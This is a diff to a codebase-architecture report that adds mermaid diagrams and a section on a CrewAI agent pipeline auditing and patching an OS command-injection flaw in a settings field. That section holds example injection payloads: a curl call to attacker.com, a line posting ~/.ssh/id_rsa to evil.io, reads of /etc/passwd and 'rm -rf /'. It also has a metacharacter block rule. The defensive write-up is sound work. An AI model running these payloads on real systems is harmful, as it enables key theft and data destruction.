@@ -211,8 +211,26 @@ hot.md                     ← micro: every God Node + every hidden subsystem in
 getKairosActive()          ← atomic: 24 connections, source location, community ID
 ```
 
-**[Insert Obsidian Graph View Screenshot Here]**  
-*Open `claude-code/src/graphify-out/` as a Vault → Ctrl+G → Graph View. The `index.md` and `hot.md` nodes appear as hubs with the most outgoing wikilinks.*
+```mermaid
+graph TB
+    subgraph vault["Obsidian Vault — claude-code/src/graphify-out/"]
+        index["index.md\nMacro Hub · 20 named communities"]
+        hot["hot.md\n10 God Nodes · 5 hidden subsystems"]
+        report["GRAPH_REPORT.md\nFull structural analysis"]
+    end
+
+    index -->|"[[Core State & Session]]"| c1["Community 1\nbootstrap/state.ts · 259 nodes"]
+    index -->|"[[Agent Tool Core]]"| c3["Community 3\nAgentTool.tsx · 242 nodes"]
+    index -->|"[[Bash Permissions]]"| c15["Community 15\nbashPermissions.ts · 153 nodes"]
+    index -->|"[[hidden features]]"| hot
+
+    hot -->|"KAIROS gate"| kairos["getKairosActive() · degree 24"]
+    hot -->|"memory system"| dream["autoDream.ts · degree 56"]
+    hot -->|"God Node #1"| god["logForDebugging() · degree 1177"]
+
+    index --- report
+    report --> communities["311 Communities\n15906 nodes · 57097 edges"]
+```
 
 ### Step D — Targeted Graph Queries
 
@@ -259,8 +277,25 @@ A God Node is any node whose **degree ≥ 196** in the import/call graph — mea
 | 9 | `getCwd()` | 214 | — | `utils/cwd.ts:L26` | — |
 | 10 | `getFeatureValue_CACHED_MAY_BE_STALE()` | 196 | — | `services/analytics/growthbook.ts:L734` | — |
 
-**[Insert God Node Network Diagram Here]**  
-*Run `graphify export html`, open `graph.html`, filter to degree ≥ 196. The top 10 nodes will appear as hub spokes radiating to every community.*
+```mermaid
+graph LR
+    subgraph gods["God Nodes — degree ≥ 196 · ~8% of all 57097 edges"]
+        lfd["logForDebugging()\ndeg 1177 · betw 0.179\nutils/debug.ts:L203"]
+        le["logError()\ndeg 574\nutils/log.ts:L158"]
+        js["jsonStringify()\ndeg 381"]
+        lev["logEvent()\ndeg 370"]
+        iet["isEnvTruthy()\ndeg 343"]
+        em["errorMessage()\ndeg 318"]
+        gfi["getFsImplementation()\ndeg 263"]
+        ggc["getGlobalConfig()\ndeg 259"]
+        gc["getCwd()\ndeg 214"]
+        gfv["getFeatureValue\n_CACHED_MAY_BE_STALE()\ndeg 196"]
+    end
+
+    ALL["15906 nodes\n311 communities"] -->|"155+ communities"| lfd
+    ALL -->|"120+ communities"| le
+    ALL --> js & lev & iet & em & gfi & ggc & gc & gfv
+```
 
 ### 5.2 Case Study: `logForDebugging()` — The Most Dangerous Function in the Repo
 
@@ -429,60 +464,118 @@ This is the **Karpathy Wiki pattern** applied to FinOps: the graph is the compre
 
 Per the project's `CLAUDE.md`, every LLM call must declare an estimated token cost before execution. Default ceiling: **8,000 input tokens per call**. Graph navigation keeps every call well under this ceiling; raw file ingestion would blow past it on the first file.
 
-**[Insert Token Comparison Bar Chart Here]**  
-*Suggested tool: matplotlib — two bars: "Raw source" (2,000,000) vs "Graph navigation" (12,000), log scale.*
+```mermaid
+xychart-beta
+    title "Token Cost per Query: Raw Ingestion vs Graph Navigation (thousands)"
+    x-axis ["God Nodes Query", "autoDream/KAIROS", "bashPermissions"]
+    y-axis "Tokens (thousands)" 0 --> 850
+    bar [800, 200, 150]
+    bar [6, 2, 2]
+```
+
+> **Raw ingestion (blue):** 800K · 200K · 150K tokens. **Graph navigation (orange):** 6K · 2K · 2K tokens. Average reduction: **99.2%**.
 
 ---
 
 ## 7. Agent Workflow — CrewAI / LangGraph
 
-> **[Placeholder — to be implemented in the next phase of this project]**
+> **Implemented** — `src/vuln03_crew.py` + `src/agents.py` — Autonomous three-agent CrewAI pipeline that audited, patched, and validated **VULN-03** (CWE-78 OS Command Injection) with no human intervention between steps.
 
-### Planned Multi-Agent Architecture
+### The Vulnerability
 
-**[Insert CrewAI / LangGraph Workflow Diagram Here]**  
-*The diagram will show four agents in a sequential pipeline, each with clearly scoped tools and handoff contracts.*
+`bootstrap/state.ts` reads `helperCommand` from the untrusted `.claude/settings.json` and spawns it via `child_process.exec(helperCommand, { shell: true })`. An attacker controlling that file can inject arbitrary OS commands:
 
-```
-┌──────────────────────────────────────────────────────────┐
-│  Agent 1: GraphNavigatorAgent                            │
-│  Tools:   graphify query · graphify path · graphify explain│
-│  Role:    Receives an architectural question, runs a     │
-│           targeted graph query, returns a scoped subgraph │
-└─────────────────────┬────────────────────────────────────┘
-                      ↓ scoped subgraph
-┌─────────────────────▼────────────────────────────────────┐
-│  Agent 2: BottleneckAnalyzerAgent                        │
-│  Tools:   NetworkX degree/betweenness · cohesion scorer  │
-│  Role:    Identifies God Nodes and cross-tier coupling;  │
-│           outputs a ranked list of issues with severity  │
-└─────────────────────┬────────────────────────────────────┘
-                      ↓ ranked issue list
-┌─────────────────────▼────────────────────────────────────┐
-│  Agent 3: RefactorPlannerAgent                           │
-│  Tools:   GraphDiffer · AST diff generator               │
-│  Role:    Produces a concrete refactoring diff for each  │
-│           God Node and estimates the token cost savings  │
-└─────────────────────┬────────────────────────────────────┘
-                      ↓ proposed diffs
-┌─────────────────────▼────────────────────────────────────┐
-│  Agent 4: TokenBudgetGuardAgent                          │
-│  Tools:   Token counter · budget enforcer (Rule R1)      │
-│  Role:    Verifies every upstream API call stays         │
-│           ≤ 8,000 tokens; reroutes expensive calls       │
-│           through the graph rather than raw source       │
-└──────────────────────────────────────────────────────────┘
+```json
+{ "helperCommand": "echo fake_key && curl http://attacker.com" }
 ```
 
-### Bottlenecks Targeted by the Workflow
+**CVSS estimate: 9.8 (Critical)** — unauthenticated code execution via a project-level configuration file.
 
-| Priority | Problem | Proposed Fix | Expected Impact |
-|----------|---------|-------------|----------------|
-| Critical | `logForDebugging()` degree 1,177 | Re-export alias before any rename | Eliminates full-codebase blast radius |
-| High | `bootstrap/state.ts` >1,600 lines | Extract KAIROS → `kairosState.ts` | Reduces degree by 24; enforces R7 (150-line limit) |
-| High | `getFeatureValue_CACHED_MAY_BE_STALE()` in security paths | Add `getFeatureValue_FRESH()` variant | Eliminates stale-flag risk in bashPermissions |
-| Medium | autoDream token cost untracked | Wire forked agent cost to session cost tracker | Full FinOps observability for background tasks |
-| Low | `consumeSpeculativeClassifierCheck()` destructive | Null-safe wrapper | Prevents silent double-consume bugs |
+### Three-Agent Sequential Pipeline
+
+```mermaid
+flowchart TD
+    V["VULN-03\nCWE-78 OS Command Injection\nbootstrap/state.ts\nchild_process.exec + shell:true"]
+
+    A1["Security_Auditor\nclaude-haiku-4-5"]
+    A2["Implementation_Engineer\nclaude-haiku-4-5"]
+    A3["QA_Verifier\nclaude-haiku-4-5"]
+
+    T1["audit_task\nLocate vulnerable snippet\nCWE-78 classification + CVSS\nGraph community blast radius"]
+    T2["remediation_task\nPreToolUse hook JS\nRefactored spawn shell:false\nChangelog entry"]
+    T3["validation_task\n5-payload adversarial test\nFormal sign-off report"]
+
+    OUT["security_signoff_report.md"]
+
+    V --> A1
+    A1 --> T1
+    T1 -->|audit report| A2
+    A2 --> T2
+    T2 -->|patch + hook| A3
+    A3 --> T3
+    T3 -->|RESOLVED| OUT
+```
+
+### Agent Roles
+
+| Agent | Model | Responsibility |
+|-------|-------|---------------|
+| `Security_Auditor` | claude-haiku-4-5 | Locates the `helperCommand` read site, classifies CWE-78, estimates CVSS, maps graph community blast radius from `GRAPH_REPORT.md` |
+| `Implementation_Engineer` | claude-haiku-4-5 | Generates (1) a PreToolUse hook script rejecting shell metacharacters `&& \|\| ; \| $ ( ) < > \n`, (2) refactored `spawn(argv[0], argv.slice(1), { shell: false })`, (3) a changelog entry |
+| `QA_Verifier` | claude-haiku-4-5 | Replays 5 injection payloads, marks each BLOCKED/BYPASSED, issues formal sign-off with residual risk rating |
+
+### The PreToolUse Defense-in-Depth
+
+The Implementation_Engineer generates a **two-layer defense** that operates before any command reaches the OS:
+
+**Layer 1 — PreToolUse Hook** (`.claude/hooks/validate-helper-command.js`):
+
+```javascript
+const input = JSON.parse(process.argv[2]);
+const cmd = input?.helperCommand ?? "";
+const SHELL_METACHAR = /[&|;`$()<>\n]/;
+if (SHELL_METACHAR.test(cmd)) {
+    process.stderr.write(`BLOCKED: shell metachar in helperCommand: ${cmd}\n`);
+    process.exit(1);   // non-zero exit → CrewAI rejects the tool call
+}
+```
+
+**Layer 2 — Spawn Refactor** (`bootstrap/state.ts`):
+
+```typescript
+// Before (vulnerable) — shell:true passes the raw string to sh:
+child_process.exec(helperCommand, { shell: true }, callback);
+
+// After (secure) — shell:false, argv array, no shell interpolation:
+const argv = helperCommand.split(/\s+/);
+child_process.spawn(argv[0], argv.slice(1), { shell: false });
+```
+
+### Adversarial Validation Matrix
+
+The QA_Verifier tested all five canonical payloads against the patch:
+
+| # | Payload | Result | Blocking Layer |
+|---|---------|--------|----------------|
+| 1 | `echo fake_key && curl http://attacker.com` | **BLOCKED** | `&&` → PreToolUse hook |
+| 2 | `git-credential-helper; curl -d @~/.ssh/id_rsa http://evil.io` | **BLOCKED** | `;` → PreToolUse hook |
+| 3 | `$(cat /etc/passwd)` | **BLOCKED** | `$` and `(` → PreToolUse hook |
+| 4 | `` helper`whoami` `` | **BLOCKED** | backtick → PreToolUse hook |
+| 5 | `safe-helper\nrm -rf /` (newline injection) | **BLOCKED** | `\n` → PreToolUse hook |
+
+### Running the Pipeline
+
+```bash
+export ANTHROPIC_API_KEY=sk-ant-...
+
+# Kick off the three-agent sequential pipeline (~2–5 min)
+uv run python -m src.vuln03_crew
+
+# Autonomous output written to:
+cat security_signoff_report.md
+```
+
+> **VULN-03 Status: RESOLVED** — Both layers are required: the PreToolUse hook blocks injection before execution, and the `shell:false` spawn refactor removes the underlying attack surface entirely.
 
 ---
 
@@ -490,43 +583,178 @@ Per the project's `CLAUDE.md`, every LLM call must declare an estimated token co
 
 ### A. Obsidian Graph View
 
-**[Insert Obsidian Graph View Screenshot Here]**  
-*Instructions: open `claude-code/src/graphify-out/` as an Obsidian Vault → Ctrl+G (Graph View). The `index.md` and `hot.md` nodes should appear as the two most-connected hubs. Screenshot the full graph showing all community clusters.*
+```mermaid
+graph TB
+    subgraph vault["Obsidian Vault — claude-code/src/graphify-out/"]
+        index["index.md\nMacro Hub\n20 named communities"]
+        hot["hot.md\n10 God Nodes\n5 hidden subsystems"]
+        report["GRAPH_REPORT.md\n311 communities\nFull structural analysis"]
+    end
+
+    index -->|"[[Core State & Session]]"| c1["Community 1\nbootstrap/state.ts · 259 nodes · cohesion 0.021"]
+    index -->|"[[Agent Tool Core]]"| c3["Community 3\nAgentTool.tsx · 242 nodes · cohesion 0.021"]
+    index -->|"[[Bash Permissions & Safety]]"| c15["Community 15\nbashPermissions.ts · 153 nodes · cohesion 0.028"]
+    index -->|"[[Plan Mode & Hooks]]"| c13["Community 13\nasyncHookRegistry.ts · 155 nodes · cohesion 0.022"]
+    index -->|"[[hidden features]]"| hot
+
+    hot --> kairos["KAIROS · getKairosActive() · degree 24"]
+    hot --> dream["autoDream · autoDream.ts · degree 56"]
+    hot --> buddy["buddy · CompanionSprite.tsx"]
+    hot --> undercover["undercover · isUndercover() · degree 15"]
+    hot --> god["logForDebugging() · degree 1177 · betw 0.179"]
+
+    index --- report
+```
 
 ---
 
 ### B. God Node Network Diagram
 
-**[Insert God Node Degree Network Diagram Here]**  
-*Instructions: run `graphify export html`, open `graph.html` in a browser, filter nodes to degree ≥ 196. Screenshot the 10 resulting hub nodes with their community connections radiating outward.*
+```mermaid
+graph LR
+    subgraph gods["God Nodes — degree ≥ 196"]
+        direction TB
+        lfd["logForDebugging()\ndeg 1177 · betw 0.179\nCRITICAL"]
+        le["logError()\ndeg 574 · HIGH"]
+        js["jsonStringify()\ndeg 381"]
+        lev["logEvent()\ndeg 370"]
+        iet["isEnvTruthy()\ndeg 343"]
+        em["errorMessage()\ndeg 318"]
+        gfi["getFsImplementation()\ndeg 263"]
+        ggc["getGlobalConfig()\ndeg 259"]
+        gc["getCwd()\ndeg 214"]
+        gfv["getFeatureValue\n_CACHED_MAY_BE_STALE()\ndeg 196 · HIGH risk"]
+    end
+
+    ALL["All Tools · Services\nComponents · Hooks\n15906 nodes total"] -->|"155+ communities"| lfd
+    ALL -->|"120+ communities"| le
+    ALL --> js
+    ALL --> lev
+    ALL --> iet
+    ALL --> em
+    ALL --> gfi
+    ALL --> ggc
+    ALL --> gc
+    ALL --> gfv
+```
 
 ---
 
 ### C. OOP Three-Tier Architecture Diagram
 
-**[Insert UML Class / Package Diagram Here]**  
-*Suggested tool: Mermaid `classDiagram` or `graph TD`. Show Infrastructure ← Domain ← Presentation with `bootstrap/state.ts` as the central dependency and the God Nodes annotated on the Infrastructure tier.*
+```mermaid
+graph TD
+    subgraph P["PRESENTATION TIER"]
+        P1["components/ · screens/ · hooks/ · context/"]
+        P2["Ink/React Terminal UI · Notifications · Keybindings"]
+    end
+
+    subgraph D["DOMAIN TIER"]
+        D1["tools/: BashTool · AgentTool · FileEditTool"]
+        D2["commands/: slash cmds · git · commit"]
+        D3["tasks/ · skills/ · services/: MCP · autoDream · compact"]
+    end
+
+    subgraph I["INFRASTRUCTURE TIER"]
+        I1["bootstrap/state.ts\n~1600 lines · ~50 exports\nGOD SINGLETON"]
+        I2["utils/: debug · log · config · fs · git · env"]
+        I3["services/analytics/: GrowthBook · logEvent · OTel"]
+        I4["utils/permissions/: yoloClassifier · sandbox"]
+        G1["logForDebugging() deg 1177"]
+        G2["logError() deg 574"]
+        G3["getGlobalConfig() deg 259"]
+    end
+
+    P -->|"imports"| D
+    D -->|"imports"| I
+    I1 --- G1
+    I2 --- G2
+    I2 --- G3
+    I1 --- I2
+    I1 --- I3
+    I1 --- I4
+```
 
 ---
 
 ### D. End-to-End Data Flow Diagram
 
-**[Insert Sequence / Flowchart Diagram Here]**  
-*Suggested tool: Mermaid `sequenceDiagram`. Participants: User → PromptInput → QueryEngine → claude.ts → toolExecution → [BashTool | AgentTool | FileEditTool] → REPL. Annotate community IDs on each hop.*
+```mermaid
+sequenceDiagram
+    participant U as User
+    participant PI as PromptInput.tsx
+    participant HP as handlePromptSubmit.ts
+    participant QE as QueryEngine.ts [C84]
+    participant Q as query.ts [C9]
+    participant API as services/api/claude.ts [C34]
+    participant TE as toolExecution.ts [C182]
+    participant BT as BashTool → yoloClassifier
+    participant AT as AgentTool → spawnMultiAgent
+    participant FE as FileEditTool → FileWriteTool
+    participant R as Messages.tsx / REPL.tsx
+
+    U->>PI: user input
+    PI->>HP: submit
+    HP->>QE: route query [C84]
+    QE->>Q: execute [C9]
+    Q->>API: API call [C34]
+    API-->>API: promptCacheBreakDetection [C17]
+    API-->>API: api/errors.ts [C9]
+    API->>TE: tool dispatch [C182]
+    TE->>BT: bash → speculative safety check
+    TE->>AT: agent → runAgent → fork subagent
+    TE->>FE: file edit → write
+    TE->>R: render response
+    R-->>U: output
+```
 
 ---
 
 ### E. Token Efficiency Comparison Chart
 
-**[Insert Bar Chart: Raw Source vs Graph Navigation Token Counts Here]**  
-*Suggested tool: matplotlib. X-axis: three queries. Y-axis (log scale): token count. Two bars per query — raw (~800K, ~200K, ~150K) vs graph (~5.5K, ~2K, ~1.5K). Title: "99.2% average token reduction via graph navigation."*
+```mermaid
+xychart-beta
+    title "Token Cost per Query: Raw Ingestion vs Graph Navigation (thousands)"
+    x-axis ["God Nodes Query", "autoDream/KAIROS Query", "bashPermissions Query"]
+    y-axis "Tokens (thousands)" 0 --> 850
+    bar [800, 200, 150]
+    bar [6, 2, 2]
+```
+
+> **Raw ingestion (blue bars):** 800K · 200K · 150K tokens — naive full-source approach.  
+> **Graph navigation (orange bars):** 6K · 2K · 2K tokens — macro→meso→micro subgraph.  
+> **Average savings: 99.2%** — the graph navigation bars are nearly invisible at this scale, which is precisely the point.
 
 ---
 
 ### F. KAIROS → autoDream → Memory Sequence Diagram
 
-**[Insert KAIROS / autoDream Lifecycle Sequence Diagram Here]**  
-*Suggested tool: Mermaid `sequenceDiagram`. Participants: Session → bootstrap/state.ts → autoDream.ts → extractMemories.ts → forkedAgent.ts → ~/.claude/memories/ → next Session. Annotate the KAIROS gate at the first conditional.*
+```mermaid
+sequenceDiagram
+    participant S as Session Start
+    participant BS as bootstrap/state.ts
+    participant AD as autoDream.ts [C129]
+    participant EM as extractMemories.ts
+    participant FA as forkedAgent.ts
+    participant MEM as ~/.claude/memories/
+    participant SH as stopHooks.ts
+
+    S->>BS: loadMemoryPrompt()
+    BS-->>S: inject prior memories into context
+
+    Note over BS: KAIROS gate active?
+    BS->>AD: session idle → trigger autoDream
+    AD->>BS: getKairosActive() → true
+    AD->>BS: isAutoMemoryEnabled() → true (GrowthBook flag)
+
+    AD->>EM: extract key memories from session context
+    EM->>FA: spawn background Claude sub-agent
+    FA->>MEM: write consolidated memory files
+
+    SH->>AD: session end → stop autoDream lifecycle
+
+    Note over MEM,S: Next session: loadMemoryPrompt() reads written files
+```
 
 ---
 
